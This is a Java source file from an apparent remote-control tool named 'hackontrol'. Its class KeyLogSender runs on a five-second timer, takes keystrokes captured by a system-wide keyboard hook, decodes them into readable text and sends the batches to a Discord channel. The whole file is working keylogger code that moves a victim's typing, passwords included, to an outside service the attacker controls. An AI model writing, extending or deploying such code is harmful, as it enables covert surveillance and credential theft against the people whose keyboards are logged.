package com.khopan.hackontrol.module.keylogger;

import java.awt.event.KeyEvent;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.handler.KeyboardHandler;
import com.khopan.hackontrol.handler.KeyboardHandler.KeyEntry;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.sendable.sender.MessageChannelSendable;

import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;

public class KeyLogSender {
	private final MessageChannel channel;

	private KeyLogSender(MessageChannel channel) {
		this.channel = channel;
		Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(this :: tick, 5000, 5000, TimeUnit.MILLISECONDS);
	}

	private void tick() {
		if(!KeyboardHandler.Enable) {
			KeyboardHandler.KEYSTROKE_LIST.clear();
			return;
		}

		if(KeyboardHandler.KEYSTROKE_LIST.isEmpty()) {
			return;
		}

		try {
			int size = KeyboardHandler.KEYSTROKE_LIST.size();
			Hackontrol.LOGGER.info("Key stroke: {}", size);
			List<String> messageList = new ArrayList<>();
			StringBuilder builder = new StringBuilder();
			boolean first = true;
			boolean previousSingleCharacter = true;
			boolean previousSpace = true;
			int limit = KeyLoggerModule.RawKeyMode ? 2000 : 1992;
			String prefix = KeyLoggerModule.RawKeyMode ? "" : "```\n";
			String suffix = KeyLoggerModule.RawKeyMode ? "" : "\n```";

			for(int i = 0; i < size; i++) {
				KeyEntry entry = KeyboardHandler.KEYSTROKE_LIST.get(i);
				String entryText;

				if(KeyLoggerModule.RawKeyMode) {
					entryText = this.getKeyEntryText(entry);
				} else {
					if(!entry.keyDown) {
						continue;
					}

					entryText = KeyConverter.decodeWin32VirtualKeyCode(entry.keyCode);
					boolean singleCharacter = KeyConverter.isSingleCharacter(entry.keyCode);
					boolean space = entry.keyCode == 0x20;

					if((space || previousSpace) || (singleCharacter && previousSingleCharacter)) {
						first = true;
					}

					previousSingleCharacter = singleCharacter;
					previousSpace = space;
				}

				entryText = (first ? "" : " ") + entryText;
				first = false;

				if(builder.length() + entryText.length() > limit) {
					messageList.add(builder.toString());
					builder = new StringBuilder();
					first = true;
				}

				builder.append(entryText);
			}

			KeyboardHandler.KEYSTROKE_LIST.clear();

			if(!builder.isEmpty()) {
				messageList.add(builder.toString());
			}

			for(int i = 0; i < messageList.size(); i++) {
				this.channel.sendMessage(prefix + messageList.get(i) + suffix).queue();
			}
		} catch(Throwable Errors) {
			Errors.printStackTrace();
			HackontrolError.throwable(MessageChannelSendable.of(this.channel), Errors);
		}
	}

	private String getKeyEntryText(KeyEntry entry) {
		String letter = KeyEvent.getKeyText(entry.keyCode);
		int count = (entry.systemKey ? 2 : 0) + (entry.fake ? 1 : 0);
		String asterisk = "*".repeat(count);
		StringBuilder builder = new StringBuilder();
		builder.append(asterisk);
		builder.append('`');
		builder.append(entry.keyDown ? '↓' : '↑');
		builder.append(letter);
		builder.append('`');
		builder.append(asterisk);
		return builder.toString();
	}

	public static void start(MessageChannel channel) {
		new KeyLogSender(channel);
	}
}
